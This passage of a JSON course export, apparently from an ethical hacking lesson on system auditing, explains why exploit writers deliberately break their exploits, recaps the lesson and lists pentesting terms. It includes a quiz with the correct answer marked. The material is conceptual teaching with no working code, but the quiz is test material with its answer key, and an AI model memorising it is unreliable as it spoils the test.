+              "text": "Exploits are the weapons of the digital age and if they fall into the wrong hands, they can easily cause a lot of destruction. For this reason, When an exploit is really dangerous, the exploit writers bug them intentionally, so that only a person who understands the exploit can fix it and use it.\n\nThe bugs are typically one of the following:\n\n* Missing special characters\n* Use of bad interpreters\n* Providing incorrect paths\n* Unjustified comments\n\n### Missing special characters\n\nExploit writers often leave out some special characters intentionally like a comma, a colon, or a semicolon. When the code is compiled, we get an error stating that the compiler is expecting one of the given special characters at a certain location in the code.\n\n### Use of bad interpreters\n\nIn languages like Python, It is important that the exploit defines the correct location of the interpreter. Exploit writers often use incorrect syntax to make sure the code doesn’t get executed without fixing the issue. A solution for this can be found with a quick internet search.\n\n### Providing incorrect paths\n\nExploits that use incorrect paths are more difficult to fix because the code does not throw any errors. The exploit will compile and execute but it won’t work as expected because the location is wrong. A fix may be found by following the path given in the PoC/Analysis of the exploit.\n\n### Unjustified comments\n\nUnjustified comments involves commenting out a section of the exploit code which causes it to be ignored.  The exploit compiles and runs without throwing errors -- but it doesn't run that section of the code that is commented out.  This is an easy fix because all you have to do is remove the unnecessary comment tags.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1124064,
+              "key": "aade28cc-7265-4285-8102-21dcbfd84d31",
+              "title": "Buggy Exploits Quiz 2",
+              "semantic_type": "RadioQuizAtom",
+              "is_public": true,
+              "instructor_notes": null,
+              "user_state": {
+                "node_key": "aade28cc-7265-4285-8102-21dcbfd84d31",
+                "completed_at": null,
+                "last_viewed_at": null,
+                "unstructured": null
+              },
+              "question": {
+                "prompt": "Which of the following is hardest to fix?",
+                "answers": [
+                  {
+                    "id": "a1610017933173",
+                    "text": "Unjustified comments",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1610018043086",
+                    "text": "Missing special characters",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1610018062574",
+                    "text": "Bad interpreters",
+                    "is_correct": false
+                  },
+                  {
+                    "id": "a1610018097640",
+                    "text": "Incorrect paths ",
+                    "is_correct": true
+                  }
+                ]
+              }
+            },
+            {
+              "id": 1126562,
+              "key": "edab1ab0-e03e-4b95-9466-96ab345a7f6a",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### New Terms\n\n| Term | Definition |\n|-|-|\n| Interpreter | Software that executes the instructions from source code without compiling it. Python is one of the popular languages which supports the use of an interpreter. | ",
+              "instructor_notes": ""
+            }
+          ]
+        },
+        {
+          "id": 1089641,
+          "key": "1637ca6e-4eae-4e04-8480-7bd6d5e3c717",
+          "title": "Lesson Recap",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "1637ca6e-4eae-4e04-8480-7bd6d5e3c717",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089636,
+              "key": "55109a30-b962-40f6-ad9d-fb51b7008024",
+              "title": "Lesson Recap Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## What We Have Learned",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089637,
+              "key": "617e5d40-df1b-4c0c-8470-f16ac748c5d4",
+              "title": "ND350 EHND C1 L2 A17 Lesson Recap V2",
+              "semantic_type": "VideoAtom",
+              "is_public": true,
+              "instructor_notes": "",
+              "video": {
+                "youtube_id": "llkzx9rCits",
+                "china_cdn_id": "llkzx9rCits.mp4"
+              }
+            },
+            {
+              "id": 1089638,
+              "key": "4f42241f-a48d-47e1-afc7-80a28e60b461",
+              "title": "Lesson Recap Summary",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "In this lesson, we studied System Auditing and focused on six topics:\n\n### Test Scopes\n\nWe learned about test scopes and how to use them while conducting a manual audit\n\n### Information Gathering\n\nWe learned how to gather information and organize it in target databases using NMap and the Metasploit Framework.\n\n### Researching Vulnerabilities & Exploits\n\nWe learned how to use the information we gathered to research vulnerabilities and exploits. We used CVE’s to find and understand vulnerabilities and we looked at Proof of Concept, public and commercial exploits.\n\n### Executing Exploits\n\nWe learned how to execute exploits and how the process for executing public exploits is different from commercial exploits.\n\n### Report Writing\n\nWe learned how to use all the information we have collected to write effective reports.\n\n### Discussion On Buggy Exploits\n\nWe ended this lesson with a discussion about why exploit writers often include intentional bugs in their exploit code so only a person who understands the exploit can fix and use the exploit.",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1133383,
+              "key": "f081c5cc-577f-400c-81d8-aaa5809142bc",
+              "title": null,
+              "semantic_type": "ImageAtom",
+              "is_public": true,
+              "url": "https://video.udacity-data.com/topher/2020/December/5fe36013_1/1.png",
+              "non_google_url": "https://s3.cn-north-1.amazonaws.com.cn/u-img/f081c5cc-577f-400c-81d8-aaa5809142bc",
+              "caption": "Up Next: Application Auditing",
+              "alt": "Up Next: Application Auditing",
+              "width": 1035,
+              "height": 187,
+              "instructor_notes": null
+            },
+            {
+              "id": 1121942,
+              "key": "c7de127e-662c-4c19-9eb4-130c5a1c45b7",
+              "title": null,
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "### In The Next Lesson, We Will Focus On:\n\n* OWASP WSTG\n* Request and Response\n* Semi-Automated Tools\n* Fully Automated Tools\n* So Many Things To Hack!",
+              "instructor_notes": null
+            }
+          ]
+        },
+        {
+          "id": 1089644,
+          "key": "42afe765-efdd-4da5-a7c8-99253f91c1b3",
+          "title": "Glossary",
+          "semantic_type": "Concept",
+          "is_public": true,
+          "user_state": {
+            "node_key": "42afe765-efdd-4da5-a7c8-99253f91c1b3",
+            "completed_at": null,
+            "last_viewed_at": null,
+            "unstructured": null
+          },
+          "resources": null,
+          "atoms": [
+            {
+              "id": 1089642,
+              "key": "5535e3ae-3491-44c0-9647-f76de31c92ae",
+              "title": "Glossary Heading",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "## New Terms In This Lesson",
+              "instructor_notes": ""
+            },
+            {
+              "id": 1089643,
+              "key": "5b19afee-2f9d-41ba-b4c7-0ed4f41e308c",
+              "title": "Glossary List",
+              "semantic_type": "TextAtom",
+              "is_public": true,
+              "text": "| Term | Definition |\n|-|-|\n| Compiler | Software that converts source code into an executable file | \n| Core-Impact | A commercial pentesting framework developed by Core Security that includes handcrafted premium exploits | \n| CVE (Common Vulnerability Exposure) | A list of known information security vulnerabilities | \n| Interpreter | Software that executes the instructions from source code without compiling it. Python is one of the popular languages which supports the use of an interpreter. | \n| Listening Host (LHOST) | The IP Address of the machine where a listener is running | \n| Listening Port (LPORT)  | The open port on the machine where a listener is running | \n| Metasploit | A commercial pentesting framework developed by Rapid7 | \n| NMap (Network Mapper) | A popular open-source reconnaissance tool | \n| NSE (Nmap Scripting Engine) | A tool to write and share scripts to automate a wide variety of networking tasks | \n| Payload | The malicious code that infects a target system | \n| Reconnaissance | Gathering information about the target | \n| Remote Host (RHOST) | The target's IP Address | \n| Remote Port (RPORT) | The open port on the target's machine | \n| Reporting | Sharing the results of an audit | \n| Research | Finding known vulnerabilities and exploits | \n| Rules for the assessment | An element in the scope that lists what is allowed and not allowed for performing an assessment. | \n| Target Database | A spreadsheet or specialized tool to store data collected during reconnaissance | \n| Test Summary | An element in the test scope that explains why the test is being conducted, the context for the test, and the goal of the test | \n| Validation | Using exploit code to confirm that a vulnerability exists | \n| Work Breakdown Sheet | An element in the test scope that gives a high-level overview of the tasks to be performed | ",
+              "instructor_notes": ""
+            }
+          ]
+        }
+      ]
+    }
+  },
+  "_deprecated": [
+    {
+      "name": "lesson_type",
+      "reason": "Obsolete"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    },
+    {
+      "name": "non_google_url",
+      "reason": "(2016/8/18) Not sure, ask i18n team for reason"
+    }
+  ]
+}
